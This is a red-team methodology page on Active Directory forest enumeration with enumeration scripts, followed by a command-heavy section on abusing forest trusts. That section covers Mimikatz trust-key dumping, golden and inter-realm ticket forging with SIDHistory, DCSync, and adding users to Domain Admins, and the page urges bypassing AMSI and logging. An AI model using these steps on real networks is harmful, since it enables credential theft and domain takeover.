[Prev: 29_LDAP_Injection.md](./29_LDAP_Injection.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 31_Detection_Index.md](./31_Detection_Index.md)

# Forest Enumeration

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

## Overview
**Forest Enumeration** is a comprehensive red team technique for discovering and analyzing Active Directory forest structure, including domains, trusts, schema, and forest-wide configurations. This method provides insights into the overall Active Directory architecture and relationships for attack planning and lateral movement.

## What Forest Enumeration Achieves
- **Forest Structure Discovery**: Map the forest hierarchy and relationships
- **Domain Enumeration**: Identify all domains within the forest
- **Trust Enumeration**: Discover trust relationships between domains
- **Schema Analysis**: Understand forest-wide schema configurations
- **Forest-Wide Objects**: Identify objects that span the entire forest
- **Attack Path Mapping**: Find forest-based attack vectors

## 📋 **QUICK START FOREST ENUMERATION**

| Phase | Tool | Command | Purpose | OPSEC |
|------|------|---------|---------|------|
| 1 | Get-ADForest | `Get-ADForest` | Basic forest info | 🟢 |
| 2 | Get-ADTrust | `Get-ADTrust -Filter *` | Trust discovery | 🟢 |
| 3 | Get-ADDomainController | `Get-ADDomainController -Filter *` | GC/DC enumeration | 🟢 |
| 4 | Get-Forest (PV) | `Get-Forest` | Enhanced forest view | 🟡 |
| 5 | nltest | `nltest /domain_trusts` | Native trust info | 🟡 |

## 🎭 **AT-A-GLANCE: FOREST ENUMERATION ESSENTIALS**

**Reveals:** Forest structure, domain hierarchy, trust relationships, global catalogs, schema configuration, forest-wide objects.

**Use Cases:** Enterprise architecture mapping, trust analysis, cross-domain attack planning, forest-wide privilege escalation, schema analysis.

**Speed:** Stealth 3–6s jitter; Balanced 1–2s; Lab unrestricted.

## 🧭 **PIVOT MATRIX: STRATEGIC NEXT STEPS**

| Finding | Immediate Pivot | Goal | Tool/Technique |
|---------|-----------------|------|----------------|
| External trust | Kerberos attacks | Inter-realm forging | Rubeus, Mimikatz |
| Many GCs in site | Network enumeration | Nearest GC targeting | Get-ADDomainController |
| Mixed FL/Schema | GPO enumeration | Legacy paths | Get-GPO, Get-GPOReport |
| Forest trusts | Cross-forest attacks | Trust abuse | Get-ADTrust, Get-DomainTrust |

---

## 🛠️ **COMPREHENSIVE ENUMERATION TOOLS**

### 🔧 Microsoft‑Signed & Native
- `Get-ADForest` — Basic forest information and structure
- `Get-ADTrust -Filter *` — Forest and domain trust enumeration
- `Get-ADDomainController -Filter *` — Global catalog and DC discovery
- `nltest /domain_trusts` — Native trust enumeration tool
- `nltest /dclist:cybercorp.local` — Domain controller listing

### ⚔️ Offensive (PowerView/SharpView)
```powershell
Get-Forest -Forest cybercorp.local
Get-ForestDomain -Forest cybercorp.local
Get-ForestGlobalCatalog -Forest cybercorp.local
Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes
Get-DomainController -Properties IsGlobalCatalog, Site, OperatingSystem
```

### 🔴 Red Team (Forest Enumeration)
```cmd
Get-ADForest -Identity cybercorp.local                                    :: Basic forest info
Get-ADTrust -Filter * -Properties *                                       :: Trust enumeration
Get-ADDomainController -Filter * -Properties IsGlobalCatalog             :: GC discovery
nltest /domain_trusts                                                     :: Native trust info
nltest /dclist:cybercorp.local                                           :: DC enumeration
```

> **🔒 STEALTH REQUIREMENT**: **Invisi-Shell** must be loaded before any forest enumeration testing in production environments to bypass logging and AMSI detection.

---

## Stealth & Loading
Use [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md) for stealth session and prep. Continue here with forest‑specific discovery only.

## CyberCorp Persona
- Persona: Victor Alvarez, Enterprise Architect. Task: map `cybercorp.local` ↔ `techventures.com` trust, verify GC placement per site, and identify legacy domains.

## Forest Trust/GC Map (unique)


## Lab vs Production
- Stealth: prefer ADWS; scope to forest root; limit properties; stagger trust/GC queries.
- Lab: full trust export; cross‑forest test queries during maintenance windows.

## Detection (concise)
- Sudden, broad trust sweeps and GC enumerations across many domains; correlate with DC locator spikes.

## Cleanup
```powershell
Remove-Variable forestResults -ErrorAction SilentlyContinue
```

## Forest Enumeration Workflow


## Forest Enumeration Tools

### 1. Native Windows Forest Tools

#### **Get-ADForest** - PowerShell Forest Access
```powershell
# Basic forest information
$forest = Get-ADForest

# Display forest details
Write-Host "Forest Name: $($forest.Name)"
Write-Host "Forest Mode: $($forest.ForestMode)"
Write-Host "Root Domain: $($forest.RootDomain)"
Write-Host "Domains: $($forest.Domains.Count)"
Write-Host "Global Catalogs: $($forest.GlobalCatalogs.Count)"
```

**Tool Explanation:**
- **Get-ADForest**: Native PowerShell Active Directory forest cmdlet
- **Forest Information**: Retrieve comprehensive forest details
- **Domain Count**: Number of domains in the forest
- **Global Catalogs**: Number of global catalog servers
- **Advantages**: Native PowerShell, comprehensive forest data
- **Disadvantages**: Requires AD module, may be logged

#### **nltest.exe** - Command Line Forest Tool
```cmd
# Forest information using nltest
nltest /dsgetdc:cybercorp.local

# Forest trust information
nltest /domain_trusts

# Forest domain enumeration
nltest /dclist:cybercorp.local
```

**Tool Explanation:**
- **nltest.exe**: Built-in Windows forest testing tool
- **/dsgetdc**: Get domain controller information
- **/domain_trusts**: List domain trusts
- **/dclist**: List domain controllers
- **Advantages**: Built into Windows, no PowerShell required
- **Disadvantages**: Limited output formatting, complex syntax

### 2. PowerShell Forest Tools

#### **PowerView - Get-Forest**
```powershell
# PowerView forest enumeration
$forest = Get-Forest

# Forest domains
$domains = Get-ForestDomain -Forest cybercorp.local

# Forest global catalogs
$globalCatalogs = Get-ForestGlobalCatalog -Forest cybercorp.local
```

**Tool Explanation:**
- **Get-Forest**: PowerView forest enumeration function
- **Get-ForestDomain**: Enumerate domains within the forest
- **Get-ForestGlobalCatalog**: Enumerate global catalog servers
- **Advantages**: PowerView integration, comprehensive forest data
- **Disadvantages**: Requires PowerView, may trigger logging

#### **PowerView - Get-DomainTrust**
```powershell
# Forest trust enumeration
$trusts = Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes

# External trusts
$externalTrusts = $trusts | Where-Object { $_.TrustType -eq "External" }

# Forest trusts
$forestTrusts = $trusts | Where-Object { $_.TrustType -eq "Forest" }
```

**Tool Explanation:**
- **Get-DomainTrust**: PowerView trust enumeration function
- **Trust Properties**: Retrieve trust details and attributes
- **Trust Filtering**: Filter trusts by type and direction
- **Advantages**: PowerView integration, detailed trust information
- **Disadvantages**: Requires PowerView, may trigger logging

### 3. Third-Party Forest Tools

#### **BloodHound - Forest Enumeration**
```powershell
# BloodHound forest enumeration
# Collect forest data with SharpHound
.\SharpHound.exe --CollectionMethod All --Domain cybercorp.local --Forest

# Import to BloodHound for analysis
# Use BloodHound queries for forest analysis
```

**Tool Explanation:**
- **BloodHound**: Graph database tool for AD attack path analysis
- **SharpHound**: Data collector for BloodHound
- **Forest Collection**: Comprehensive forest data gathering
- **Advantages**: Visual analysis, attack path mapping, comprehensive coverage
- **Disadvantages**: Requires BloodHound, external tool, learning curve

#### **PowerSploit - Forest Enumeration**
```powershell
# PowerSploit forest enumeration
Import-Module PowerSploit

# Forest enumeration functions
Get-ForestDomain -Forest cybercorp.local
Get-ForestTrust -Forest cybercorp.local
```

**Tool Explanation:**
- **PowerSploit**: Offensive PowerShell framework
- **Forest Functions**: Dedicated forest enumeration functions
- **Comprehensive Coverage**: Complete forest enumeration capabilities
- **Advantages**: Offensive framework, comprehensive functions
- **Disadvantages**: Requires PowerSploit, highly detectable

### 4. Custom Forest Enumeration Scripts

#### **Comprehensive Forest Enumeration Script**
```powershell
# Comprehensive forest enumeration
function Invoke-ComprehensiveForestEnumeration {
    param([string]$ForestName = "cybercorp.local")
    
    try {
        Write-Host "Comprehensive Forest Enumeration for $ForestName" -ForegroundColor Green
        Write-Host "=" * 70
        
        $forestResults = @{
            ForestInfo = $null
            Domains = @()
            Trusts = @()
            GlobalCatalogs = @()
            Schema = @{}
            Configuration = @{}
        }
        
        # Forest Information
        Write-Host "Getting forest information..." -ForegroundColor Yellow
        try {
            $forest = Get-ADForest -Identity $ForestName
            $forestResults.ForestInfo = @{
                Name = $forest.Name
                ForestMode = $forest.ForestMode
                RootDomain = $forest.RootDomain
                Domains = $forest.Domains
                GlobalCatalogs = $forest.GlobalCatalogs
                Sites = $forest.Sites
                ApplicationPartitions = $forest.ApplicationPartitions
                CrossForestReferences = $forest.CrossForestReferences
                SPNSuffixes = $forest.SPNSuffixes
                UPNSuffixes = $forest.UPNSuffixes
            }
            
            Write-Host "Forest Information:" -ForegroundColor Green
            Write-Host "  Name: $($forest.Name)"
            Write-Host "  Forest Mode: $($forest.ForestMode)"
            Write-Host "  Root Domain: $($forest.RootDomain)"
            Write-Host "  Domains: $($forest.Domains.Count)"
            Write-Host "  Global Catalogs: $($forest.GlobalCatalogs.Count)"
            Write-Host "  Sites: $($forest.Sites.Count)"
            Write-Host "  Application Partitions: $($forest.ApplicationPartitions.Count)"
            Write-Host "  Cross-Forest References: $($forest.CrossForestReferences.Count)"
            Write-Host "  SPN Suffixes: $($forest.SPNSuffixes.Count)"
            Write-Host "  UPN Suffixes: $($forest.UPNSuffixes.Count)"
            
        }
        catch {
            Write-Host "Failed to get forest information: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Forest Domain Analysis (Focus on Forest Relationships)
        Write-Host "`nAnalyzing forest domain relationships..." -ForegroundColor Yellow
        try {
            foreach ($domain in $forest.Domains) {
                Write-Host "Analyzing domain: $domain" -ForegroundColor Cyan
                
                try {
                    $domainInfo = Get-ADDomain -Identity $domain
                    
                    # Focus on forest-specific properties
                    $domainDetails = @{
                        Name = $domainInfo.Name
                        NetBIOSName = $domainInfo.NetBIOSName
                        DomainMode = $domainInfo.DomainMode
                        ParentDomain = $domainInfo.ParentDomain
                        ChildDomains = $domainInfo.ChildDomains
                        # Forest-specific: Replication and trust relationships
                        ReplicaDirectoryServers = $domainInfo.ReplicaDirectoryServers
                        ReadOnlyReplicaDirectoryServers = $domainInfo.ReadOnlyReplicaDirectoryServers
                        # Forest-specific: Cross-domain operations
                        InfrastructureMaster = $domainInfo.InfrastructureMaster
                        PDCEmulator = $domainInfo.PDCEmulator
                        RIDMaster = $domainInfo.RIDMaster
                        SchemaMaster = $domainInfo.SchemaMaster
                        DomainNamingMaster = $domainInfo.DomainNamingMaster
                    }
                    
                    $forestResults.Domains += $domainDetails
                    
                    Write-Host "  NetBIOS: $($domainInfo.NetBIOSName)"
                    Write-Host "  Mode: $($domainInfo.DomainMode)"
                    Write-Host "  Parent: $($domainInfo.ParentDomain)"
                    Write-Host "  Children: $($domainInfo.ChildDomains.Count)"
                    Write-Host "  Replicas: $($domainInfo.ReplicaDirectoryServers.Count)"
                    
                    # Forest-specific analysis
                    if ($domainInfo.ParentDomain) {
                        Write-Host "  Forest Role: Child Domain" -ForegroundColor Yellow
                    } else {
                        Write-Host "  Forest Role: Forest Root" -ForegroundColor Green
                    }
                    
                }
                catch {
                    Write-Host "  Warning: Could not get details for domain $domain" -ForegroundColor Yellow
                    $forestResults.Domains += @{
                        Name = $domain
                        Error = $_.Exception.Message
                    }
                }
                
                Write-Host ""
            }
            
        }
        catch {
            Write-Host "Forest domain analysis failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        Write-Host "Note: For comprehensive domain enumeration, see [Domain Enumeration](./04_Domain_Enumeration.md)" -ForegroundColor Cyan
        
        # Trust Enumeration
        Write-Host "Enumerating trusts..." -ForegroundColor Yellow
        try {
            $trusts = Get-ADTrust -Filter * -Server $forest.RootDomain
            
            foreach ($trust in $trusts) {
                $trustInfo = @{
                    Name = $trust.Name
                    TrustType = $trust.TrustType
                    TrustDirection = $trust.TrustDirection
                    TrustAttributes = $trust.TrustAttributes
                    Source = $trust.Source
                    Target = $trust.Target
                    IsTransitive = $trust.IsTransitive
                    TrustStatus = $trust.TrustStatus
                    WhenCreated = $trust.WhenCreated
                    WhenChanged = $trust.WhenChanged
                }
                
                $forestResults.Trusts += $trustInfo
                
                Write-Host "Trust: $($trust.Name)"
                Write-Host "  Type: $($trust.TrustType)"
                Write-Host "  Direction: $($trust.TrustDirection)"
                Write-Host "  Source: $($trust.Source)"
                Write-Host "  Target: $($trust.Target)"
                Write-Host "  Transitive: $($trust.IsTransitive)"
                Write-Host "  Status: $($trust.TrustStatus)"
                Write-Host ""
            }
            
        }
        catch {
            Write-Host "Trust enumeration failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Global Catalog Analysis
        Write-Host "Analyzing global catalogs..." -ForegroundColor Yellow
        try {
            foreach ($gc in $forest.GlobalCatalogs) {
                Write-Host "Global Catalog: $gc" -ForegroundColor Cyan
                
                try {
                    $gcDetails = Get-ADDomainController -Identity $gc -Properties *
                    
                    $gcInfo = @{
                        Name = $gcDetails.Name
                        Site = $gcDetails.Site
                        IPAddress = $gcDetails.IPv4Address
                        OperatingSystem = $gcDetails.OperatingSystem
                        IsGlobalCatalog = $gcDetails.IsGlobalCatalog
                        IsReadOnly = $gcDetails.IsReadOnly
                    }
                    
                    $forestResults.GlobalCatalogs += $gcInfo
                    
                    Write-Host "  Site: $($gcDetails.Site)"
                    Write-Host "  IP: $($gcDetails.IPv4Address)"
                    Write-Host "  OS: $($gcDetails.OperatingSystem)"
                    Write-Host "  ReadOnly: $($gcDetails.IsReadOnly)"
                    
                }
                catch {
                    Write-Host "  Warning: Could not get details for GC $gc" -ForegroundColor Yellow
                }
                
                Write-Host ""
            }
            
        }
        catch {
            Write-Host "Global catalog analysis failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Schema Analysis
        Write-Host "Analyzing forest schema..." -ForegroundColor Yellow
        try {
            $schemaMaster = $forest.SchemaMaster
            
            try {
                $schema = Get-ADObject -Identity "CN=Schema,CN=Configuration,$($forest.RootDomain)" -Server $schemaMaster -Properties *
                
                $forestResults.Schema["SchemaMaster"] = $schemaMaster
                $forestResults.Schema["SchemaObject"] = $schema
                
                # Get schema classes
                $schemaClasses = Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$($forest.RootDomain)" -Filter "objectClass=classSchema" -Server $schemaMaster -Properties name, objectClass, whenCreated, whenChanged
                
                $forestResults.Schema["SchemaClasses"] = $schemaClasses
                
                # Get schema attributes
                $schemaAttributes = Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$($forest.RootDomain)" -Filter "objectClass=attributeSchema" -Server $schemaMaster -Properties name, objectClass, whenCreated, whenChanged
                
                $forestResults.Schema["SchemaAttributes"] = $schemaAttributes
                
                Write-Host "Schema Information:" -ForegroundColor Green
                Write-Host "  Schema Master: $schemaMaster"
                Write-Host "  Schema Classes: $($schemaClasses.Count)"
                Write-Host "  Schema Attributes: $($schemaAttributes.Count)"
                
                # Show some schema classes
                Write-Host "`nSample Schema Classes:" -ForegroundColor Cyan
                $schemaClasses | Select-Object -First 10 | ForEach-Object {
                    Write-Host "  $($_.name)"
                }
                
                # Show some schema attributes
                Write-Host "`nSample Schema Attributes:" -ForegroundColor Cyan
                $schemaAttributes | Select-Object -First 10 | ForEach-Object {
                    Write-Host "  $($_.name)"
                }
                
            }
            catch {
                Write-Host "Warning: Could not get schema information from $schemaMaster" -ForegroundColor Yellow
            }
            
        }
        catch {
            Write-Host "Schema analysis failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Forest-Wide Configuration
        Write-Host "`nAnalyzing forest-wide configuration..." -ForegroundColor Yellow
        try {
            # Application partitions
            $appPartitions = $forest.ApplicationPartitions
            $forestResults.Configuration["ApplicationPartitions"] = $appPartitions
            $forestResults.Configuration["TotalAppPartitions"] = $appPartitions.Count
            
            # SPN suffixes
            $spnSuffixes = $forest.SPNSuffixes
            $forestResults.Configuration["SPNSuffixes"] = $spnSuffixes
            $forestResults.Configuration["TotalSPNSuffixes"] = $spnSuffixes.Count
            
            # UPN suffixes
            $upnSuffixes = $forest.UPNSuffixes
            $forestResults.Configuration["UPNSuffixes"] = $upnSuffixes
            $forestResults.Configuration["TotalUPNSuffixes"] = $upnSuffixes.Count
            
            # Cross-forest references
            $crossForestRefs = $forest.CrossForestReferences
            $forestResults.Configuration["CrossForestReferences"] = $crossForestRefs
            $forestResults.Configuration["TotalCrossForestRefs"] = $crossForestRefs.Count
            
            Write-Host "Forest-Wide Configuration:" -ForegroundColor Green
            Write-Host "  Application Partitions: $($appPartitions.Count)"
            Write-Host "  SPN Suffixes: $($spnSuffixes.Count)"
            Write-Host "  UPN Suffixes: $($upnSuffixes.Count)"
            Write-Host "  Cross-Forest References: $($crossForestRefs.Count)"
            
            if ($appPartitions.Count -gt 0) {
                Write-Host "`nApplication Partitions:" -ForegroundColor Cyan
                foreach ($partition in $appPartitions) {
                    Write-Host "  $partition"
                }
            }
            
            if ($spnSuffixes.Count -gt 0) {
                Write-Host "`nSPN Suffixes:" -ForegroundColor Cyan
                foreach ($suffix in $spnSuffixes) {
                    Write-Host "  $suffix"
                }
            }
            
            if ($upnSuffixes.Count -gt 0) {
                Write-Host "`nUPN Suffixes:" -ForegroundColor Cyan
                foreach ($suffix in $upnSuffixes) {
                    Write-Host "  $suffix"
                }
            }
            
            if ($crossForestRefs.Count -gt 0) {
                Write-Host "`nCross-Forest References:" -ForegroundColor Cyan
                foreach ($ref in $crossForestRefs) {
                    Write-Host "  $ref"
                }
            }
            
        }
        catch {
            Write-Host "Forest-wide configuration analysis failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        Write-Host "`nForest Enumeration Complete!" -ForegroundColor Green
        return $forestResults
        
    }
    catch {
        Write-Warning "Comprehensive forest enumeration failed: $($_.Exception.Message)"
        return $null
    }
}

# Execute comprehensive forest enumeration
$forestResults = Invoke-ComprehensiveForestEnumeration -ForestName "cybercorp.local"
```

**Tool Explanation:**
- **Custom Function**: Tailored forest enumeration for comprehensive analysis
- **Multiple Components**: Cover all major forest components
- **Error Handling**: Graceful handling of failed queries
- **Structured Output**: Organized results for analysis
- **Advantages**: Comprehensive coverage, customizable, error handling
- **Disadvantages**: Custom code, may be complex

## Forest Analysis Techniques

### 1. Trust Analysis

#### **Trust Relationship Analysis**
```powershell
# Analyze trust relationships
function Analyze-TrustRelationships {
    param([array]$Trusts)
    
    try {
        Write-Host "Analyzing trust relationships..." -ForegroundColor Yellow
        Write-Host "=" * 50
        
        $analysis = @{
            TotalTrusts = $Trusts.Count
            TrustTypes = @{}
            TrustDirections = @{}
            TransitiveTrusts = 0
            NonTransitiveTrusts = 0
            ExternalTrusts = 0
            ForestTrusts = 0
        }
        
        foreach ($trust in $Trusts) {
            # Count trust types
            $trustType = $trust.TrustType
            if (-not $analysis.TrustTypes.ContainsKey($trustType)) {
                $analysis.TrustTypes[$trustType] = 0
            }
            $analysis.TrustTypes[$trustType]++
            
            # Count trust directions
            $trustDirection = $trust.TrustDirection
            if (-not $analysis.TrustDirections.ContainsKey($trustDirection)) {
                $analysis.TrustDirections[$trustDirection] = 0
            }
            $analysis.TrustDirections[$trustDirection]++
            
            # Count transitive vs non-transitive
            if ($trust.IsTransitive) {
                $analysis.TransitiveTrusts++
            } else {
                $analysis.NonTransitiveTrusts++
            }
            
            # Count external vs forest trusts
            if ($trust.TrustType -eq "External") {
                $analysis.ExternalTrusts++
            } elseif ($trust.TrustType -eq "Forest") {
                $analysis.ForestTrusts++
            }
        }
        
        # Display analysis
        Write-Host "Trust Analysis:" -ForegroundColor Green
        Write-Host "  Total Trusts: $($analysis.TotalTrusts)"
        Write-Host "  Transitive: $($analysis.TransitiveTrusts)"
        Write-Host "  Non-Transitive: $($analysis.NonTransitiveTrusts)"
        Write-Host "  External: $($analysis.ExternalTrusts)"
        Write-Host "  Forest: $($analysis.ForestTrusts)"
        
        Write-Host "`nTrust Types:" -ForegroundColor Cyan
        foreach ($type in $analysis.TrustTypes.Keys) {
            Write-Host "  $type`: $($analysis.TrustTypes[$type])"
        }
        
        Write-Host "`nTrust Directions:" -ForegroundColor Cyan
        foreach ($direction in $analysis.TrustDirections.Keys) {
            Write-Host "  $direction`: $($analysis.TrustDirections[$direction])"
        }
        
        return $analysis
        
    }
    catch {
        Write-Warning "Trust relationship analysis failed: $($_.Exception.Message)"
        return $null
    }
}

# Analyze trust relationships
$trustAnalysis = Analyze-TrustRelationships -Trusts $forestResults.Trusts
```

**Tool Explanation:**
- **Trust Analysis**: Analyze trust relationships and patterns
- **Trust Classification**: Categorize trusts by type and direction
- **Security Assessment**: Evaluate trust security implications
- **Attack Vector Identification**: Identify trust-based attack paths
- **Advantages**: Security insights, attack path identification
- **Disadvantages**: Complex analysis, requires trust knowledge

### 2. Schema Analysis

#### **Schema Version Analysis**
```powershell
# Analyze schema versions across domains
function Analyze-SchemaVersions {
    try {
        Write-Host "Analyzing schema versions across domains..." -ForegroundColor Yellow
        Write-Host "=" * 50
        
        $schemaVersions = @{}
        
        foreach ($domain in $forestResults.Domains) {
            Write-Host "Checking schema version for domain: $($domain.Name)" -ForegroundColor Cyan
            
            try {
                # Get domain schema version
                $domainInfo = Get-ADDomain -Identity $domain.Name
                $schemaVersion = $domainInfo.SchemaVersion
                
                $schemaVersions[$domain.Name] = @{
                    Domain = $domain.Name
                    SchemaVersion = $schemaVersion
                    SchemaMaster = $domainInfo.SchemaMaster
                }
                
                Write-Host "  Schema Version: $schemaVersion"
                Write-Host "  Schema Master: $($domainInfo.SchemaMaster)"
                
            }
            catch {
                Write-Host "  Warning: Could not get schema version for domain $($domain.Name)" -ForegroundColor Yellow
                $schemaVersions[$domain.Name] = @{
                    Domain = $domain.Name
                    Error = $_.Exception.Message
                }
            }
            
            Write-Host ""
        }
        
        # Check for schema version mismatches
        $versions = $schemaVersions.Values | Where-Object { $_.SchemaVersion } | Select-Object -ExpandProperty SchemaVersion
        $uniqueVersions = $versions | Sort-Object -Unique
        
        if ($uniqueVersions.Count -gt 1) {
            Write-Host "⚠ Schema version mismatch detected!" -ForegroundColor Red
            Write-Host "  Versions found: $($uniqueVersions -join ', ')" -ForegroundColor Red
        } else {
            Write-Host "✓ All domains have consistent schema version: $($uniqueVersions[0])" -ForegroundColor Green
        }
        
        return $schemaVersions
        
    }
    catch {
        Write-Warning "Schema version analysis failed: $($_.Exception.Message)"
        return $null
    }
}

# Analyze schema versions
$schemaVersions = Analyze-SchemaVersions
```

**Tool Explanation:**
- **Schema Version Analysis**: Compare schema versions across domains
- **Mismatch Detection**: Identify schema version inconsistencies
- **Schema Master Analysis**: Analyze schema master distribution
- **Security Implications**: Understand schema security implications
- **Advantages**: Schema insights, security assessment
- **Disadvantages**: Complex analysis, requires schema knowledge

## OPSEC Considerations

### 1. Stealth Techniques
- **Gradual Discovery**: Spread forest enumeration over time
- **Targeted Queries**: Focus on specific forest components
- **Normal User Context**: Use regular user accounts when possible
- **Limited Scope**: Focus on necessary forest information

### 2. Detection Avoidance
- **Event Logging**: Be aware of forest enumeration events
- **Network Monitoring**: Consider network traffic patterns
- **Query Patterns**: Avoid predictable query patterns
- **Response Analysis**: Analyze responses for anomalies

## Best Practices

### 1. Forest Enumeration
- **Scope Definition**: Clearly define enumeration scope
- **Tool Selection**: Choose appropriate tools for the environment
- **Documentation**: Document all findings and forest structure
- **Validation**: Verify discovered information

### 2. Security Analysis
- **Trust Analysis**: Evaluate trust relationship security
- **Schema Analysis**: Understand schema modifications
- **Configuration Review**: Review forest-wide settings
- **Monitoring**: Implement forest monitoring

## Related Objects
- [Domain Enumeration](./04_Domain_Enumeration.md)
- [Kerberos Enumeration](./23_Kerberos_Basic_Enumeration.md)
- [DNS Enumeration](./03_DNS_Enumeration.md)
- [LDAP Injection](./29_LDAP_Injection.md)

## Navigation
- [Master Index](../00_MASTER_INDEX.md)
- [Enumeration Index](./00_Enumeration_Index.md)

## See Also
- [Time-Based Enumeration](./21_Time_Based_Enumeration.md)
- [WMI Enumeration](./20_WMI_Enumeration.md)

---

**Tags**: #ForestEnumeration #ActiveDirectory #AD #Enumeration #Forest #Trusts #Schema #RedTeam

## 🚀 Forest Trust Abuse Workflow

### Overview
Abuse inter-forest trusts by forging inter-forest tickets using trust keys to access resources across forests.

### Step-by-Step (from Remediation_Plan.md)
```powershell
# 1) We require the trust key of inter-forest trust
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# 2) Forge the inter-forest TGT
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:ad.domain.local /sid:<sid> /rc4:<rc4-hash> /service:krbtgt /target:domain2.local /ticket:C:\temp\trust_forest_tkt.kirbi"'

# 3) Request a TGS for target service in the other forest
.\asktgs.exe C:\temp\trust_forest_tkt.kirbi CIFS/dc.domain2.local

# 4) Inject and use the TGS
.\kirbikator.exe lsa .\CIFS.computer.targetDomain.local.kirbi
ls \\dc.domain2.local\shares\

# Optional: DCSync in target forest (requires privileges)
Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:dc.domain2.local /all /cvs"'

# Enumerate ForeignSecurityPrincipal to identify cross-forest access SIDs
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

# Example: Find a specific ForeignSecurityPrincipal SID in current domain
Get-DomainObject |? {$_.objectsid -match "S-1-5-21-493355955-4215530352-779396340-1104"}
```

### Cross-Forest Abuse Example
```powershell
# Use forged inter-forest TGT and operate across forest
Invoke-Mimikatz -Command '"kerberos::golden /user:student21 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46ad8bd66c6efd77603da26796f35 /ptt"'

# Basic reconnaissance/actions in remote forest
gwmi -Class win32_computersystem -ComputerName mcorp-dc.moneycorp.local
net localgroup administrators
net localgroup Administrators student21 /add
net localgroup "Remote Desktop Users" student21 /add
net group "DOMAIN ADMINS" student21 /domain /add

# Check First Degree Object Controls
net group "SQLMANAGERS" examAd /domain /add
```

### Enhanced SIDHistory Manipulation Workflows

#### **SIDHistory Enumeration and Analysis**
```powershell
# Enumerate SIDHistory attributes across forests
Get-DomainObject -Properties sidhistory | Where-Object {$_.sidhistory -ne $null}

# Find objects with specific SIDHistory values
Get-DomainObject -Properties sidhistory | Where-Object {$_.sidhistory -like "*S-1-5-21-*"}

# Cross-forest SID mapping
$foreignSIDs = Get-DomainObject -Properties sidhistory | Where-Object {$_.sidhistory -ne $null}
foreach ($obj in $foreignSIDs) {
    Write-Host "Object: $($obj.samaccountname)"
    Write-Host "  SIDHistory: $($obj.sidhistory)"
    Write-Host "  Domain: $($obj.domain)"
}
```

#### **SIDHistory-Based Privilege Escalation**
```powershell
# Create Golden Ticket with SIDHistory for cross-forest access
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:source.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /sids:S-1-5-21-0987654321-0987654321-0987654321-519 /krbtgt:KRBTGT_HASH /ptt"'

# Use SIDHistory for cross-forest group membership
# The SIDHistory S-1-5-21-0987654321-0987654321-0987654321-519 represents Enterprise Admins in target forest

# Verify SIDHistory in current session
klist /sids
```

#### **Advanced Inter-Realm Execution Techniques**
```powershell
# Multi-hop SIDHistory chaining
# Step 1: Extract SIDHistory from high-privilege objects
$highValueObjects = Get-DomainObject -Properties sidhistory | Where-Object {
    $_.sidhistory -like "*S-1-5-21-*-519" -or  # Enterprise Admins
    $_.sidhistory -like "*S-1-5-21-*-512"      # Domain Admins
}

# Step 2: Create tickets with multiple SIDHistory values
$sidHistoryList = $highValueObjects | ForEach-Object {$_.sidhistory} | Select-Object -Unique
$sidHistoryString = ($sidHistoryList | ForEach-Object {$_}) -join ","

# Step 3: Forge ticket with multiple SIDHistory values
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:source.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /sids:'$sidHistoryString' /krbtgt:KRBTGT_HASH /ptt"'
```

### Notes
- Requires appropriate privileges to extract trust keys and perform DCSync.
- OPSEC: High detection risk; pace actions and limit scope.
- SIDHistory manipulation can bypass cross-forest security controls.
- Monitor for unusual SIDHistory values and cross-forest access patterns.

---

## ⚔️ Execution

### Cross-Domain/Forest Abuse (SIDHistory, Inter-Realm TGT)
```powershell
# Extract trust keys / enumerate trusts (see Remediation Plan/advanced)
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# Forge inter-realm TGT to target forest
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:src.local /sid:<srcSID> /rc4:<trustKey> /service:krbtgt /target:target.local /ticket:C:\temp\interrealm.kirbi"'

# Request TGS in target forest
.\asktgs.exe C:\temp\interrealm.kirbi CIFS/dc.target.local
.\kirbikator.exe lsa .\CIFS.dc.target.local.kirbi

# Optional: operate with SIDHistory path if present (group mapping/ForeignSecurityPrincipal)
Get-DomainObject -Domain target.local | ? {$_.objectclass -match 'foreignSecurityPrincipal'}
```
- See detection in `11_Detection_Blue_Team.md`; OPSEC in `12_Detection_Red_Team.md`.

---

[Prev: 29_LDAP_Injection.md](./29_LDAP_Injection.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 31_Detection_Index.md](./31_Detection_Index.md)

---

## 🎯 **COMPREHENSIVE FOREST ENUMERATION COMMAND REFERENCE (20+ Commands)**

### **1. Native Windows Forest Commands (Get-ADForest/Get-ADTrust)**

#### **Basic Forest Information Commands**
```powershell
# Basic forest information
Get-ADForest
Get-ADForest -Identity cybercorp.local
Get-ADForest -Current LocalComputer

# Forest properties
Get-ADForest -Properties *
Get-ADForest -Properties Name, ForestMode, RootDomain, Domains, GlobalCatalogs
Get-ADForest -Properties Sites, ApplicationPartitions, CrossForestReferences
```

